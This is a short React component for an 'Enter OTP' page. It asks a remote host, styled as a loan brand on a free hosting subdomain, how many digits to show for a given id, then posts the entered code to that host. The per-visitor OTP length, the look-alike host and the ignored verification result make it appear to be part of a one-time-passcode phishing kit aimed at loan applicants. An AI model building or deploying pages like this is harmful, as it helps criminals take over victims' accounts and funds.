import { useParams } from "react-router-dom";
import { useState, useEffect } from "react";
import axios from "axios";
import "../styles/app.css";

export default function OTP() {
  const { id } = useParams();

  const [length, setLength] = useState(6);
  const [otp, setOtp] = useState([]);

  useEffect(() => {
    axios.get(`https://g-bayport-loans.onrender.com/otp-length/${id}`)
      .then(res => {
        setLength(res.data.length);
        setOtp(Array(res.data.length).fill(""));
      });
  }, []);

  const handleChange = (val, index) => {
    const newOtp = [...otp];
    newOtp[index] = val;
    setOtp(newOtp);
  };

  const handleSubmit = async () => {
    await axios.post(
      "https://g-bayport-loans.onrender.com/verify-otp",
      {
        id,
        otp: otp.join("")
      }
    );

    alert("Submitted");
  };

  return (
    <div className="loan-container">
      <div className="card">

        <h1>Enter OTP</h1>

        <div style={{ display: "flex", gap: "8px", justifyContent: "center" }}>
          {otp.map((v, i) => (
            <input
              key={i}
              maxLength="1"
              onChange={(e) => handleChange(e.target.value, i)}
              style={{ width: "40px", textAlign: "center" }}
            />
          ))}
        </div>

        <button className="btn" onClick={handleSubmit}>
          Submit
        </button>

      </div>
    </div>
  );
}